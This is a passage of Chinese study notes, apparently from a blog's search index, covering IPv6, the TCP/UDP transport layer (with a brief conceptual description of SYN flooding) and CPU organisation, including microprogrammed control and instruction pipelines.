6 个比较重要 IPv6 地址长度扩大到 128 位 IPv6 移除了校验和减少了每跳的处理时间 IPv6 移除了 IPv4 的可选字段, 变成了扩展首部比较灵活, 路由器一般不检测扩展首部提高了路由器的处理效率 IPv6 支持即插即用自动配置, 不需要 DHCP IPv6 首部的长度必须是8B的整数倍, IPv4 首部是4B的整数数 IPv6 只能在主机处分片, IPv4 可以在路由器和主机处分片 IPv6 使用 ICMPv6,附加报文类型–分组过大 IPv6 支持资源的预分配, 支持实时视像等要求, 保证一定的带宽和时延的应用 IPv6 取消了协议字段, 改成下一个首部字段 IPv6 取消了总长度字段, 改用有效载荷长度字段 IPv6 取消了服务类型字段 IPv6 地址形式 基本地址类型 单播一对一通信可做源地址和目的地址 多播一对多通信只能作为目的地址 任播一对多的一个通信只可做目的地址 IPv6 与 Ipv4 的兼容 双栈计算双协议栈技术就是指在一台设备上同时启用 IPv4 协议栈和 IPv6 协议栈. 这样的话, 这台设备既能和 IPv4 网络通信, 又能和 IPv6 网络通信如果这台设备是一个路由器, 那么这台路由器的不同接口上, 分别配置了 IP4 地址和 IPv6 地址, 并很可能分别连接了 IPv4 网络和 IPv6 网络如果这台设备是一个计算机, 那么它将同时拥有 IPv4 地址和 IPv6 地址, 并具备同时处理这两个协议地址的功能 隧道计算通过使用互联网络的基础设施在网络之间传递数据的方式使用隧道传递的数据(或负载)可以是不同协议的数据帧或包隧道协议将其它协议的数据帧或包重新封装然后通过隧道发送","link":"/network-network5/"},{"title":"计算机网络——传输层","text":"计算机网络——传输层 目录 基本概念 传输层功能 传输层的寻址和端口 端口（逻辑端口/软件端口） TCP 面向连接的传送控制协议 特点 TCP 首部格式（重点） TCP 连接管理 TCP 三次握手（建立连接） TCP 释放连接 TCP 可靠传输 校验 序号 确认 重传 TCP 流量控制 拥塞控制 慢开始和拥塞避免 慢开始原理 拥塞避免原理 慢开始和拥塞避免结合 快重传和快恢复 快重传原理 快恢复原理 拥塞控制与流量控制的区别 UDP 无连接的用户数据报协议 特点 UDP 首部格式 UDP 校验 基本概念 只有主机才有传输层及以上的层次 传输层为应用层提供通信服务, 使用网络层的服务 传输层功能 提供进程之间的逻辑通信 网络层提供的是主机之间的逻辑通信 复用和分用 复用应用层所有的应用进程可以通过传输层在传输到网络层 多个进程公用一个接口 分用传输层从网络层收到数据后交付给指明的应用进程 对收到的报文进行差错检错 传输层的寻址和端口 端口(逻辑端口/软件端口)传输层的 SAP用于标识目标主机中的应用进程 路由器/交换机中与物理链路相连的叫硬件端口 端口号 端口号只有本地意义(只在本主机生效), 网络中的不同计算机的端口之间没有任何关系 端口号长度16bit, 能标识 65535 个不同端口 熟知端口号0~1023TCP/IP 最重要的一些应用程序, 让所有用户都知道 一般在服务器中使用 登记端口号1024~49151为没有熟知端口号的应用程序使用 客户端口号49152~65535仅在客户进程运行时才动态选择(由操作系统分配) 应用程序 端口号 FTP 21 SSH 22 TELNET 23 SMTP 25 DNS 53 TFTP 69 HTTP 80 SNMP 161 HTTPS 443 套接字={主机 IP 地址:端口号}套接字唯一标识了网络中的一个主机和该主机上的进程 TCP 面向连接的传送控制协议可靠,面向连接, 时延大,适用与大文件 特点 TCP 是面向连接(虚连接)的传输层协议 传送数据之前,必须建立连接 数据传送结束后,要释放连接 每一天 TCP 连接只能有 2 个端点每一条 TCP 连接只能是点对点的 TCP 提供可靠交付的服务无差错, 不丢失, 不重复, 按序到达 TCP 提供全双工通信有发送缓存和接收缓存 发送缓存准备发送的数据和已发送但未收到确认的数据 接收缓存按序到达但应用程序还未读取的数据和不按序到达的数据 面向字节流把应用层传来的数据看成一串无结构的字节流 流: 流入到程序 或 从进程流出的字节序列 TCP 首部格式(重点) TCP 连接传送的字节流中的每一个字节都按序号编号 字段名 含义 序号 该字段标识本报文段发送的数据的第一个字节的序号 确认号 期望收到对方下一个报文段的第一个数据字节的序号;若确认号为 N, 则序号 N-1 之前的所有序号都已正确收到 数据偏移 4 位.表示 TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远.以 32 bit 字(即 4 字节)为基本单位 保留字段 保留位今后使用,目前应置 0 URG(紧急比特) 为1 时,告诉系统此报文段中有紧急数据, 应尽快传送(相当于高优先级的数据) , 配合紧急指针使用 (在 TCP 发送缓存中最先发送,不管其位置在哪) ACK(确认比特) 只有当 ACK =1 时确认号字段才有效.当 ACK = 0 时,确认号无 效 PSH(推送比特) 接收 TCP 收到推送比特置 1 的报文段, 就尽快地交付给接收应用进程, 而不再等到整个缓存都填满了后再向上交付 RST(复位比特) 为 1 时, 表明 TCP 连接中出现严重差错(如由于主机崩溃或其他原因), 必须释放连接, 然后再重新建立传输连接 (可有拒绝非法连接) SYN(同步比特) 为 1时表示这是一个连接请求或连接接受报文 FIN(终止比特) 用来释放一个连接. 为1 时表明发送数据已发送完毕, 并要求释放传输连接 窗口字段 2 字节. 用来控制对方发送的数据量, 单位为字节. TCP 连接的一端根据设置的缓存空间大小确定自己的接收窗口大小, 然后通知对方以确定对方的发送窗口的上限 校验和 2 字节. 检验和字段检验的范围包括首部和数据这两部分. 在计算检验和时, 要在 TCP 报文段的前面加上 12 字节的伪首部 紧急指针 2 字节. 紧急指针指出在本报文段中的紧急数据的最后一个字节的序号 选项字段 长度可变. TCP 只规定了一种选项, 即最大报文段长度 MSS . 通知对方 TCP–”我的缓存所能接收的报文段的数据字段的最大长度是 MSS 个字节” 填充字段 使整个首部长度是 4 字节的整数倍. TCP 连接管理TCP 连接的建立采用客户服务器方式, 主动发起连接建立的应用进程叫客户, 被动等待连接建立的应用叫服务器 TCP 三次握手(建立连接) A 的 TCP 向 B 发出连接请求报文段其首部中的同步位SYN = 1, 并选择序号seq= x表明传送数据时的第一个数据字节的序号是 x B 的 TCP 收到连接请求报文后,如同意,则发回确认.确认报文段中应使SYN = 1, ACK = 1, 确认号 ack = x + 1, 自己选择的序号 seq = y A 收到此报文段后向 B 给出确认其ACK = 1, 确认号 ack = y + 1A 与 B 的 TCP 通知上层应用进程连接已建立 SYN 洪泛攻击, SYN 洪泛攻击发生在 OSI 第四层,这种方式利用 TCP 协议的特性, 就是三次握手攻击者发送 TCP SYN, SYN 是 TCP 三次握手中的第一个数据包, 而当服务器返回 ACK 后, 该攻击者就不对其进行再确认, 那这个 TCP 连接就处于挂起状态, 也就是所谓的半连接状态,服务器收不到再确认的话, 还会重复发送 ACK 给攻击者, 这样更加会浪费服务器的资源攻击者就对服务器发送非常大量的这种 TCP 连接, 由于每一个都没法完成三次握手, 所以在服务器上, 这些 TCP 连接会因为挂起状态而消耗 CPU 和内存, 最后服务器可能死机, 就无法为正常用户提供服务了 TCP 释放连接 A 把连接释放报文段首部的 FIN = 1, 序号seq = u, 等待 B 的确认 B 发出确认首部ACK = 1 , 确认号ack= u + 1,序号seq = vTCP 服务器进程通知高层应用进程.此时 A 到 B 方向的连接释放, TCP 连接处于半关闭状态B 若发送数据,A 仍然要接收 若 B 没有数据向 A 发送,就向 A 发送连接释放报文,首部ACK = 1,FIN = 1, 序号seq = w, 确认号ack = u+ 1 A 收到 B 的释放报文,向 B 发送确认首部ACK = 1, seq = u + 1, 确认号ack = w + 1 等待2MSL后,TCP 连接真正释放为了保证 A 的最后一个确认报文段能到达 B防止已失效的连接请求报文段出现在本连接中A 在发送完最后一个确认报文段后,在经过 2MSL, 就可以使本链接持续的时间内所产生的所有报文段,都从网络中消失,这样就可以是下一个新的连接中不会出现这种旧的连接请求报文段 TCP 可靠传输保证接收方进程从缓冲区读出字节流与发送方发出的字节流是完全一样的 校验与 UDP 校验一样,增加伪首部通过校验和校验 序号一个字节占一个序号序号字段指的是一个报文段(数据)第一个字节的序号 确认接收方在合适的适合发送确认也可以在自己要发送数据时, 把确认信息顺便带上一起发送注意, TCP 默认使用累计确认(标明已经接收到 n 号帧和之前的所有数据, 若提取收到后面的数据,中间缺失了一部分, 发送的确认中还是确认的按序的大的序号) 接收方不应过分推迟确认发送, 否则会导致发送方不必要的重传, 浪费网络资源发送方收到确认后, 会将报文段从发送缓存中删除 重传TCP 发送方在规定时间(重传时间内没有收到确认则重传已发送的报文段(超时重传) 使用自适应算法, 动态改变重传时间 RTTs(加权平均往返时间)第一次测量到RTT样本时$$RTTs=RTT$$以后每测量到一个新的 RTT 样本,就按下列公式计算$$RTTs = (1 - \\alpha ) \\times RTTs + \\alpha \\times RTT$$( $\\alpha$ 越小,RTTs值更新越慢, $\\alpha$ 越大,RTTs值更新越快)( $0&lt;\\alpha &lt;1$ ) 这个好像只需要了解, 不需要掌握 冗余 ACK(冗余确认)(也叫快速重传)每当比期待序号大的失序报文到达时, 发送一个冗余 ACK, 指明下一个期待字节的序号 TCP 流量控制 让发送方的发送速度减慢 利用滑动窗口机制实现流量控制接收方根据自己接收缓存的大小, 动态的调整发送方的发送窗口大小即 接收窗口 rwnd(接收方设置确认报文段的窗口字段来将 rwnd 通知给发送方), 发送方的发送窗口取接收窗口 rwnd 和拥塞窗口 cwnd 最小值 下面例子中, 建立连接时,主机 B 告诉主机 Arwnd=400 持续计时器目的:解决死锁问题(接收端发送给接发送端的报文丢失) 只要 TCP 连接的一方接收到对方的零窗口通知,就启动改持续计时器 若持续计时器设置的时间到期,就发送一个零窗口探测报文段(仅携带 1 字节的数据),而对方就在确认这个探测报文段时给出了现在的窗口值 若窗口值仍然是零,则收到这个报文段的一方就重新设置持续计时器.若不是零则死锁打破 拥塞控制 拥塞网络中某资源的去求超过了该资源所能提供的可用部分,网络的性能就要变坏 出现拥塞的原因(条件)对资源需求的总和 &gt; 可用资源 网络中许多资源同时供应不足-&gt;网络性能变差-&gt;网络吞吐量随输入增大而下降 目的防止过多的数据注入到网络中(全局性) 以下算法的假定 数据单方向传送, 另一个方向只传送确认 接收方总是有足够大的缓存空间, 发送窗口大小取决于拥塞程度 发送窗口大小=min{接收窗口 rwnd,拥塞窗口 cwnd} 接收窗口: 接收方根据接收缓存设置的值, 告知发送方,反应接收方容量拥塞窗口: 发送方估算网络拥塞程度而设置的窗口值, 反应网络当前容量 慢开始和拥塞避免 慢开始原理 在主机刚刚开始发送报文段时可先将拥塞窗口 cwnd 设置为一个最大报文段 MSS 的数值 在每收到一个对新的报文段的确认后,将拥塞窗口增加MIN(N, MSS) 指数增长速率其中 N 为原先未被确认,但现在被刚收到的确认报文段所确认的字节数 发送端在开始发送数据时, 注入到网络的分组大大减少, 有利于防止网络拥塞 拥塞避免原理在每经过一个往返时延 RTT 后, 将拥塞窗口增加一个 MSS 的数值 线性增长速率 慢开始和拥塞避免结合 ssthresh: 慢开始门限 收到确认后就执行算法 cwnd &lt; ssthresh时, 使用慢开始算法 cwnd &gt; ssthresh时, 使用拥塞避免算法 cwnd = ssthresh时, 可以使用任一种算法 无论在慢开始阶段还是在拥塞避免阶段,只要发送方判断网络出现拥塞(重传定时器超时),就执行: $$ssthresh = max(cwnd/2, 2)\\\\cwnd = 1\\\\执行慢开始算法$$ 网络拥塞时会修改 ssthresh使发生拥塞的路由器有足够时间把队列中积压的分组处理完毕 快重传和快恢复 快重传原理 快重传可以让发送方尽早知道发生了个别报文段的丢失 发送端只要一连收到三个重复的 ACK 即可断定有分组丢失了,就重传丢失的报文段而不必等到计时器超时 快恢复原理当发送端收到连续三个重复的 ACK 时, 就重新设置慢开始门限 ssthresh 与慢开始不同之处是拥塞窗口 cwnd 不是设置为 1, 而是设置为 ssthresh + 3 × MSS 若收到的重复的 ACK 为 n 个(n &gt; 3), 则将 cwnd 设置为 ssthresh + n × MSS 若发送窗口值还容许发送报文段, 就按拥塞避免算法继续发送报文段 若收到了确认新的报文段的 ACK, 就将 cwnd 缩小到 ssthresh 拥塞控制与流量控制的区别 拥塞控制是 防止过多的数据注入到网络中,使网络中的路由器或链路不致过载 所要做的都有一个前提,就是网络能够承受现有的网络资源 是一个全局性的过程,涉及到所有的主机、路由器,以及与降低网络传输性能有关的所有因素 流量控制 指点对点通信量的控制,是端到端的问题(接收端控制发送端) 要做的是抑制发送端发送的速率,以便接收端来得及接收 UDP 无连接的用户数据报协议不可靠, 无连接, 时延小, 适用与小文件 UDP 只在 IP 数据报服务上增加了分用和差错检测功能 特点 无连接减少开销和发送数据之前的时延 使用最大努力交付不保证可靠交付 面向报文适合一次性传输少量数据的网络应用对应用层传下来的报文不做任何改变,直接将其封装到传输层数据报的数据部分一次性发完一个完整的报文 无拥塞控制适合实时应用 首部开销小首部长度8B(TCP 的20B) UDP 首部格式 源端口号可有可无, 标识时哪个应用程序发送的 目的端口号发送给目的主机的哪个进程 UDP 长度数据报的全部长度(包括首部和数据部分) UDP 检验和检验整个 UDP 数据报是否出错(包括首部和数据部分) 分用时, 找不到对应的目的端口号 接收方丢弃报文, 并给发送方发送 ICMP”端口不可达|差错报告报文 UDP 校验 伪首部在计算校验和才使用, 不传递到上下层伪首部第 4 个字段17指的是封装该 UDP 报文的 IP 数据报首部协议字段是 17UDP 长度: UDP 首部8B+数据部分长度(不包括伪首部) 每 4 个字节为一块, 分块相加 发送端计算校验和 拼接伪首部 全 0 填充校验和字段 全 0 填充数据部分(填充为4B的倍数) 伪首部+首部+数据部分 采用二进制反码求和 求和反码填入检验和字段 去掉伪首部, 发送 接收端检验校验和 拼接伪首部 伪首部+首部+数据部分采用二进制反码求和若求和结果全为 1, 则无差错否则丢弃数据报或交给应用层附上出差错的警告","link":"/network-network6/"},{"title":"计算机组成原理——中央处理器","text":"计算机组成原理——中央处理器 目录 CPU 的功能与基本结构 功能 指令控制 操作控制 时间控制 数据加工 中断处理 组成 运算器 运算器的结构 算术逻辑单元 通用寄存器组 暂存寄存器 累加寄存器（ACC） 程序状态字寄存器（PSW） 移位器 计数器 控制器 控制器的组成 控制单元（CU）（核心部件） 指令寄存器（IR） 指令译码器 程序计数器（PC） 微操作信号发生器 时序系统 存储器地址寄存器（MAR） 存储器数据寄存器（MDR） 指令执行 周期 指令周期 机器周期 时钟周期 指令周期流程 取址周期 间址周期 执行周期 中断周期 指令执行方案 数据通路（高频考） CPU 内部总线方式 寄存器之间的数据传送 主存与 CPU 之间数据传送 执行算术或逻辑运算 例题 专用通路方式 取指周期 控制器设计 硬部件控制器 特点 微程序控制器 微程序控制器的基本结构（常考） 微程序控制器的工作流程 微指令的设计 微指令的格式 微指令的编码方式（常考） 直接编码（直接控制）方式（常考） 字段直接编码 字段间接编码（隐式编码） 微指令的地址形成方式 微程序控制单元的设计 微程序设计的分类 硬布线与微程序比较（常考） 指令流水线 性能指标 指令流水线的影响因素（常考数据冲突） 流水线的分类 部件功能级,处理机级和处理机间级流水线 单功能流水线和多功能流水线 动态流水线和静态流水线 线性流水线和非线性流水线 流水线的多发技术 超标量技术 超流水技术 超长指令字 五段式指令流水线（考试题目分析） 运算类指令 LOAD 指令 STORE 指令 条件转移指令 无条件转移指令 CPU 的功能与基本结构CPU 种对用户可见的寄存器有 程序状态字寄存器(PSW), 累加寄存器(ACC), 通用寄存器, 程序计数器(PC) 功能 指令控制 程序的顺序控制 完成取指令,分析指令和指令执行的操作 操作控制管理并产生由内存取出的每条指令的操作信号, 把各种操作信号送往相应的部件, 从而控制这些部件按指令的要求运行 时间控制对各种操作加上时间控制时间控制要为每条指令按时间顺序提供控制信号 数据加工对数据进行算数运算和逻辑运算 中断处理对计算机运行过程中出现的异常情况和特殊请求做处理 组成 其中 PC,PSW,ACC,和通用寄存器对用户可见 运算器对数据进行加工 运算器的结构 算术逻辑单元进行算数逻辑运算 通用寄存器组存放操作数和各种地址信息等 专用数据通路方式根据指令执行过程中的数据和地址的流动方向安排连接线路性能较高, 基本不存在数据冲突的现象, 但是结构复杂, 硬件量大, 不易实现 两个部件之间有专用线路 CPU 内部单总线方式将所有寄存器的输入和输出端连接到数据总线上, 用电信号来控制读\\写哪个寄存器结构简单,容易实现, 但数据传输存在较多冲突现象, 性能较低 暂存寄存器(使用 CPU 内部单总线方式时才存在) 用于暂存从主存读来的数据 累加寄存器(ACC)用于暂时存放 ALU 的运算结果 程序状态字寄存器(PSW)保留由算术逻辑运算指令或测试指令的结果(溢出标志, 符号标志, 零标志等) 移位器对运算结果进行移位运算 计数器控制乘除运算的操作步骤 控制器协调并控制计算机各部件执行程序的指令序列有取指令, 分析指令, 执行指令的功能控制器能区分存储单元中存放的是指令还是数据 完成一条指令的步骤PC 取址令–&gt;IR 分析指令–&gt;CU 执行指令 控制器的组成 控制单元(CU)(核心部件)分析指令, 给出控制信号 CU 发出一个微命令, 可完成对应微操作 每个时钟周期内可以完成多个微操作这些微操作互不影响(不使用同一条通路) FE,IND,EX,INT 四个触发器集成在 CU 内分别标识当前处于哪一个周期(取指周期, 间址周期, 执行周期, 中断周期) 根据指令操作码, 目前的机器周期, 时钟信号, 机器状态条件 可确定当前时钟周期应该发出的微命令每个时钟周期发出一个时钟信号(循环) 每个输出的控制信号对应一个微命令(微操作) 指令寄存器(IR)存放当前执行的指令 指令译码器对操作码译码, 向控制器提供操作信号 程序计数器(PC)存放下一条指令地址, 有自动加 1 功能 长度取决与 MDR 长度相等$$MDR位数=\\frac{存储容量}{字长}$$ 微操作信号发生器根据 IR 的内容, PSW 的内容, 时序信号, 产生控制整个计算机系统所需的各种控制信号有组合逻辑型和存储逻辑型两种 时序系统产生各种时序信号(由统一时钟分频得到) 存储器地址寄存器(MAR)存放所要访问的主存单元的地址 存储器数据寄存器(MDR)存放向主存写入的信息或者从主存读出的信息 指令执行 取址操作由控制器自动进行 周期 计算机工作的最小时间周期是时钟周期 指令周期 CPU 从主存中每取出并执行一条指令所需的全部时间 指令周期用若干个机器周期来表示 每个指令周期内机器周期数可以不等, 每个机器周期内的节拍数也可以不等 机器周期机器周期也叫 CPU 周期机器周期用来表示完成某一个操作所用的时间 定长的机器周期执行每种操作所用的时间相同, 以可能出现的时钟周期为准 不定长的机器周期执行不同操作所用的时间不相同 一个机器周期包含若干时钟周期 时钟周期时钟周期也称为节拍,T 周期,CPU 时钟周期,是 CPU 操作的最基本单位 指令周期流程四个工作周期都有 CPU 访存操作, 只是访存的目的不同指令在执行时都有可能被外部中断打断 取址周期取指令的流程 将当前指令地址送至存储器地址寄存器(MAR)(PC)-&gt;MAR CU 发出控制信号(读信号), 经控制总线传到主存1-&gt;R 将 MAR 所指的主存内容经数据总线送入 MDRM(MAR)-&gt;MDR 将 MDR 中的内容(当前存放的是指令)送入 IR(MDR)-&gt;IR CU 发出控制信号, 形成下一条指令地址(PC)+1-&gt;PC 间址周期取有效地址 将指令的地址码送入 MAR Ad(IR)-&gt;MAR 或 Ad(MDR)-&gt;MAR CU 发出控制信号, 启动主存读操作 1-&gt;R 将 MAR 所指主存中的内容经数据总线送入 MDR M(MAR)-&gt;MDR 将有效地址送至指令的地址码字段 (MDR)-&gt;Ad(IR) 执行周期取操作数 中断周期暂停当前任务去完成其他任务, 需要保存断点(为了能够恢复当前任务)一般使用堆栈保存断点 只有出现中断请求时, 才会进入中断周期 CU 控制将 SP 减 1, 修改后的地址送入 MAR(SP)-1-&gt;SP, (SP)-&gt;MAR 堆栈一般是在主存中,故也可记为将断点地址存入某个存储单元 a-&gt;MAR CU 发出控制信号 启动主存做写操作1-&gt;W 将断点(PC 内容)送入 MDR(PC)-&gt;MDR CU 控制将中断服务程序的入口地址送入 PC(由向量地址形成部件产生 )向量地址-&gt;PC 指令执行方案 单指令周期 所有指令的周期相同 指令之间串行执行 指令周期取决于执行时间最长的指令的执行时间 会拖慢执行快额度指令的执行速度, 导致整个系统运行速度降低 多指令周期 对不同类型的指令选用不同的执行步骤来完成 指令之间串行执行 可选用不同个数的时钟周期来完成不同的指令 需要更复杂的硬件设计 流水线方案 在每一个时钟周期内启动一条指令 尽量多条指令同时运行, 但各自处于不同的执行步骤中 指令之间并行执行 数据通路(高频考)数据在各功能部件之间传送的路径 内部总线指同一部件, 如 CPU 内部连接各寄存器及运算部件之间的总线 系统总线指同一台计算机系统的各部件,如 CPU,内存,通道和各类 I/O 接口间相互连接的总线 Bus 指的是 CPU 内部总线 数据通路的结构 CPU 内部单总线方式同一时间只能支持一个数据交换 CPU 内部多总线方式同一时间可以有多个数据交换 专用数据通路方式部件之间有专门的数据通路 注意一定要表明控制信号也要注意题目给出的部件中控制信号的位置,根据位置来选择正确的控制信号 CPU 内部总线方式 寄存器之间的数据传送例如 将 PC 内容送到 MAR, 流程及控制信号:(PC)-&gt;Bus ($PC_{out}$有效,表示 PC 内容传送到总线)Bus-&gt;MAR ($MAR_{in}$有效,表示总线内容写道 MAR) 也可记为(PC)-&gt;Bus-&gt;MAR 主存与 CPU 之间数据传送例如 CPU 从主存读取指令(PC)-&gt;Bus-&gt;MAR ($PC_{out}$和$MAR_{in}$有效)(将现在的指令地址传送到 MAR)1-&gt;R (CU 发读命令,通过控制总线发出)MEM(MAR)-&gt;MDR ($MDR_{in}$有效)MDR-&gt;Bus-&gt;IR ($MDR_{out}$,$IR_{in}$有效) 执行算术或逻辑运算例如加法指令Ad(IR)-&gt;Bus-&gt;MAR ($MDR_{out}$, $MAR_{in}$有效)1-&gt;R CU 发出读命令MEM(MAR)-&gt;数据线-&gt;MDR ($MDR_{in}$有效)MDR-&gt;Bus-&gt;Y ($MDR_{out}$, $ALU_in$有效)操作数-&gt;Y(ACC) + (Y)-&gt;Z ($ACC_{out}$,$ALU_{in}$有效)CU 向 ALU 发送加命令Z-&gt;ACC ($Z_{out}$,$ACC_{in}$有效) 结果-&gt;ACC 例题 分析指令的功能和指令周期(($R_0$)) + ($R_1$)-&gt;$(R_0$)有取址周期, 间址周期, 执行周期 写出各阶段的指令流程1-4 为取址周期: 公共操作5-7 为间址周期: 完成取数操作,被加数在主存中,加数已经放在寄存器$R_1$中8-10 为执行周期: 完成取数操作,被加数在主存中,加数已经放在寄存器$R_1$中 时序 微操作 有效控制信号 1 $(PC)-&gt;MAR$ $PC_{out}, MAR_{in}$ 2 $M(MAR)-&gt;MDR$,$(PC)+1-&gt;PC$ $MemR,MAR_{out},MDR_{in}E$ 3 $(MDR)-&gt;IR$ $MDR_{out},IR_{in}$ 4 $指令译码$ 5 $(R_0)-&gt;MAR$ $R0_{out},MAR_{in}$ 6 $M(MAR)-&gt;MDR$ $MemR,MAR_{out},MDR_{in}E$ 7 $(MDR)-&gt;Y$ $MDR_{out},Y_{in}$ 8 $(R_1)+(Y)-&gt;Z$ $R1_{out},ALU_{in}$,CU 向 ALU 发 ADD 控制信号 9 $(Z)-&gt;MDR$ $Z_{out},MDR_{in}$ 10 $(MDR)-&gt;M(MAR)$ $MemW,MDR_{out}E,MAR_{out}$ 专用通路方式部件之间有专门的数据通路 取指周期 MDR 与主存可以双向传输数据, MAR 单向传输到 IRMAR 单向向主存传输数据PC 单向传输到 MARIR 单向传输到 PC 和微操作信号发生器 控制器设计 硬部件控制器 微程序控制器 硬部件控制器 设计步骤 分析每个阶段的微操作序列(取指, 间址, 执行, 中断) 确定哪些指令在什么阶段,什么条件下使用哪些微操作 选择 CPU 的控制方式 选择定长机器周期或不定长机器周期(每个机器周期安排多少时钟周期) 安排微操作时序 根据第一步得到的信息将微操作安排在时钟周期内 电路设计 每个微命令对应的逻辑表达式并用电路实现 设计原则 微操作的先后顺序不能随意改变 被控对象不同的微操作尽量安排在一个节拍内完成 占用时间较端的微操作尽量安排在一个节拍内完成, 并允许右先后顺序 特点 指令越多, 设计和实现越复杂因此一般用于 RISC(精简指令集系统) 扩充指令困难如果扩充一条新指令, 则控制器的设计需要大改 执行速度快使用纯硬件实现微操作控制信号由组合逻辑电路即时产生 微程序控制器微程序由微指令序列组成, 每一种指令对应一个微程序 指令指对程序执行步骤的描述微指令是对指令执行步骤的描述一个微指令中可能包含多个微操作微命令与微操作一一对应所有微程序和微指令存放在控制器存储器中微周期(微指令周期): 从控制存储器中取出一条微指令并执行相应的微操作所需的时间 微指令的基本格式微指令由操作控制和顺序控制字段组成操作控制字段指明需要执行那几个微操作顺序控制指明下一条微指令的地址 微程序控制器的基本结构(常考) 微地址形成部件产生初始微地址和后继微地址保证微指令的连续执行 控制存储器 CM用于存放各指令对应的微程序控制存储器可用只读存储器 ROM 构成 按地址寻访 CMAR(微地址寄存器)接收微地址形成部件送来的微地址为在 CM 中读取微指令做准备 功能与 PC 差不多 CMDR用于存放从 CM 中取出的微指令位数同微指令字长 相当于 IR 地址译码将地址转化为存储单元控制信号 顺序逻辑控制微指令的执行顺序 微程序控制器的工作流程 CPU 将指令的操作码送给微地址形成部件确定微指令序列的起始地址 根据顺序逻辑的标志为, 确定微指令的存放地址 将要执行的微指令的微地址存放到 CMAR 中, 经过地址译码, 选中 CMAR 指向的微指令 取出该微指令,存放到 CMDR 中 将微指令中的顺序控制字段送到顺序逻辑部件中, 用于控制下一条要执行的微指令将微指令中的操作控制字段向 CPU 内部和系统总线发出控制信号 取址周期,间址周期,中断周期中一样的微指令序列可用共享使用取址周期,间址周期,中断周期对应的微程序段通常是公用的; 执行周期的各不相同(若有 n 条机器指令, 则 CM 中微程序的个数至少是 n+1 个)部分 CPU 可不提供间接寻址和中断功能(不包含间址周期和中断周期)一条指令对应一个微程序 微指令的设计 微命令与微操作一一对应一个微命令对应一根输出线一条微指令包含多个微命令(让多个微命令并行执行) 微指令的格式 相容性微命令: 可以并行完成的微命令互斥性微命令: 不能并行完成的微命令 水平型微指令一条微指令定义多个可并行的微命令 完成某一功能所需的微指令的数量少, 执行速度快 微指令长, 编写微程序较困难 垂直型微指令一条微指令只能定义一个微命令由微操作码规定具体功能 微指令短, 简单, 规整, 便于编写微程序 完成某一功能所需的微指令的数量多, 执行速度慢, 工作效率低 混合型微指令在垂直型微指令的基础上增加一些不复杂的并行操作 指令较端, 仍然便于编写 完成某一功能所需的微指令所需的数量不多, 执行速度较快 微指令的编码方式(常考) 目标: 保证速度的情况下, 缩短微指令字长以水平型微指令为例 直接编码(直接控制)方式(常考)在微指令的控制字段中, 每一位代表一个微操作命令控制字段的某一位为1, 表示该控制信号有效 简单, 直观, 执行速度快, 操作并行好 指令字长过长, n 个微命令需要 n 位的操作控制字段 字段直接编码将微指令的控制字段分成若干段每段译码后发出控制信号 分段原则 互斥性微命令在同一段相容性微命令在不同段 每段的信息位尽量少降低译码线路的复杂性和译码时间 每小段留出一个状态表示本字段不发出任何微命令 字段长度为n, 至多能表示 $2^{n-1}$ 个互斥微命令 可以缩短微指令字长 需要译码后在发出微命令, 比直接编码方式更慢 字段间接编码(隐式编码)一个字段的某些微命令需由另一个字段中的某些微命令来解释(不是靠字段直接译码发出的微命令) 进一步的缩短微指令字长 减弱了微指令的并行控制能力长作为字段直接编码的辅助手段 微指令的地址形成方式 常考由微指令的下地址字段指出和增量计数法 由微指令的下地址字段指出(断定法)(常考)指出微指令格式中设置下一个地址字段由微指令的下地址字段直接指出后继微指令的地址也被称为断定方式 根据机器指令的操作码形成机器指令取至指令寄存器后, 微指令的地址由操作码经微地址形成部件形成 增量计数法(CMAR) + 1 -&gt; CMAR 分支转移指明判断条件, 条件成立则转移待指明的转移地址 通过测试网络 由硬件产生微程序入口地址 微程序控制单元的设计 微指令执行完后, 需要花一个时钟周期将下一条 指令地址(不同方式)放到 CMAR 设计步骤 分析每个阶段的微操作序列 写出对应机器指令的微操作命令及时钟周期安排写出每个周期内所需的微操作(参照硬布线)补充微程序控制器特有的操作 取址周期 Ad(CMAR)-&gt;CMAR, OP(IR)-&gt;微地址形成部件-&gt;CMAR执行周期 Ad(CMDR)-&gt;CMAR 确定微指令格式根据微操作的个数, 选择编码方式, 确定微指令操作控制字段的位数根据 CM 中存储的微指令总数, 确定微指令的顺序控制字段的位数按照操作控制字段位数和顺序控制字段位数确定微指令字长 编写微指令码点根据操作控制字段每一位代码的微操作命令, 编写每一条微指令的码点 微程序设计的分类 静态微程序设计和动态微程序设计 静态微程序无需改改变, 采用 ROM 动态通过改变微指令和微程序改变机器指令有利于仿真, 采用 EPROM 豪微程序设计用豪微程序解释微程序 硬布线与微程序比较(常考) 微程序控制器 硬布线 工作原理 微操作控制信号以微程序的形式存放在控制存储器中, 执行指令时读出即可 微操作控制信号由逻辑组合电路根据当前的指令码,状态和时序即时产生 执行速度 慢 快 规整性 较规整 繁琐, 不规则 应用场合 CISC CPU RISC CPU 扩充性 易扩充修改 很难扩充修改 指令流水线 顺序执行方式 传统冯诺依曼机采用顺序执行方式(串行执行方式) $$总耗时T=n条指令\\times 每条指令执行的时间$$ 优点控制简单, 硬件代价小 缺点执行指令的速度慢在任何时刻, 处理机中只有一条指令在执行各功能部件的利用率低 一次重叠执行方式$$总耗时T=每条指令执行的时间\\times (1+2n)$$ 优点程序的执行时间缩短了$\\frac{1}{3}$各功能部件的利用率提高 缺点需要付出硬件上较大的开销代价控制过程比顺序执行复杂 二次重叠方式$$总耗时T=每条指令执行的时间\\times (2+n)$$ 优点指令的执行时间缩短$\\frac{2}{3}$正常情况下, 处理机中同时执行 3 条指令 缺点 流水线的表示方式 指令执行过程图主要用于分析指令执行过程及影响流水线的因素 时空图主要用于分析流水线的性能 性能指标 装入时间: 各个部件都开始工作所需的时间排空时间: 各个部件都停止工作所需的时间 吞吐率单位时间内流水线完成的指令数量(输出结果的数量)$$吞吐率=\\frac{执行的指令数量}{所花费的时间}$$ 加速比完成同样数量的任务, 不使用流水线所用的时间与使用流水线随用的时间的比值$$加速比=\\frac{不使用流水线所需的时间}{使用流水线所需的时间}$$ 效率流水线设备的利用率(硬件设备处于忙碌的时间占总时间的比例)$$流水线效率=\\frac{n个任务占用k时空区的有效面积}{n个任务所用的时间与看个流水线所围成的时空区总面积}$$ 相当于下图的$$\\frac{蓝色框减红色框面积}{红色框面积}$$或者$$\\frac{有数字的块的面积}{空白块面积+有数字块面积}$$ 指令流水线的影响因素(常考数据冲突) 影响因素 原因 解决方法 结构相关(资源冲突) 